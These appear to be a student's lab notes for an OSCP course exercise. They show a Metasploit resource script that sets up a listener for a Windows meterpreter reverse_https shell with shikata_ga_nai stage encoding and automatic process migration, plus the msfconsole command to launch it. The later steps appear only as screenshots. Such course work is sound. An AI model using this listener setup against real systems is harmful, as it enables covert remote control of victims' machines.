22.6.1.1

# 22.6.1.1.1. Create a resource script using both a second stage encoder and autorun scripts and use it with the meterpreter payload.

Create a resource script
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/22_metasploitFramework$ cat setup.rc 
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.119.214
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```
![a3ae764e22731b9ad38bd7fc187cad7b.png](0fb1769df3a6473bb36f050dcf60b3e6.png)

Execute the script (ie. configure and run the listener)
`sudo msfconsole -r setup.rc`
![cfaa48d484765b2c1b773b2ee68c98ba.png](9da9707999a9490f8dd7291746fcf9d7.png)
![bad453b7be1ad325e7e74604d2e92a6c.png](715e8e13cc0043dbbae6c3c6841d0de5.png)

Create an executable containing a meterpreter payload
![bed1a133e98d91a7e42c9d83e85e299e.png](7030858b21d8425b98cce91dea3451e0.png)

Transfer the executable to the Windows vm via netcat, and run it
![375847a7eb3377efa0c9827c36880779.png](5c86702e00b14a69840078837c2fad91.png)
![43a0abba82bbac48bed082bbbfd48a86.png](d0223b2b6b0847fcbe682b07b803b0a4.png)

We see the multi/handler accepts the connection
![535af037ff9dd91ae6841dce701b4cf2.png](5df179d70d514e4cb509fafbbfa8a932.png)
